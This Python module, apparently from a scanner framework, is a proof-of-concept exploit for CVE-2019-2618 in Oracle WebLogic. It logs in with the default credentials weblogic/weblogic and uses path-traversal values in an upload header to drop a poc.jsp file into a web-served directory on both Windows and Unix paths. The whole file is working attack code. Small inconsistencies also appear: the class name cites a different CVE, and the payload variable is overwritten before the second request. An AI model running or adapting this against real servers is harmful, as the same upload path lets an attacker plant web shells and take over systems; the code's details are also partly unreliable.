#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2019-2618
# 必须要用户名密码正确才可以验证，鸡肋
# updated 2019/10/23
# by 0xn0ne

from stars import universe, Star, target_type
from utils import http


@universe.groups()
class CVE_2018_2894(Star):
    info = {
        'NAME': '',
        'CVE': 'CVE-2019-2618',
        'TAG': []
    }
    type = target_type.MODULE

    def light_up(self, dip, dport, force_ssl=None, *args, **kwargs) -> (bool, dict):
        filename = 'poc.jsp'
        data = f'''
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="{filename}"; filename="{filename}"
Content-Type: false

hello

------WebKitFormBoundary7MA4YWxkTrZu0gW--
'''
        headers = {'username': 'weblogic',
                   'password': 'weblogic',
                   'wl_request_type': 'app_upload',
                   'wl_upload_application_name': '\\\\..\\\\tmp\\\\_WL_internal\\\\bea_wls_internal\\\\9j4dqk\\\\war',
                   'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW'}
        url = 'http://{}:{}/bea_wls_deployment_internal/DeploymentService'.format(dip, dport)
        win_res, data = http(url, 'POST', headers=headers, data=data, ssl=force_ssl)
        url = 'http://{}:{}/bea_wls_deployment_internal/DeploymentService'.format(dip, dport)
        headers['wl_upload_application_name'] = '/../tmp/_WL_internal/bea_wls_internal/9j4dqk/war'
        unx_res, data = http(url, 'POST', headers=headers, data=data, ssl=force_ssl)
        if (win_res != None and win_res.status_code != 404) or (unx_res != None and unx_res.status_code != 404):
            return True, {'msg': 'finish.'}
        # if (win_res != None and filename in win_res.text) or (unx_res != None and filename in unx_res.text):
        #     return True, {'msg': 'finish.'}
        return False, {'msg': 'finish.'}
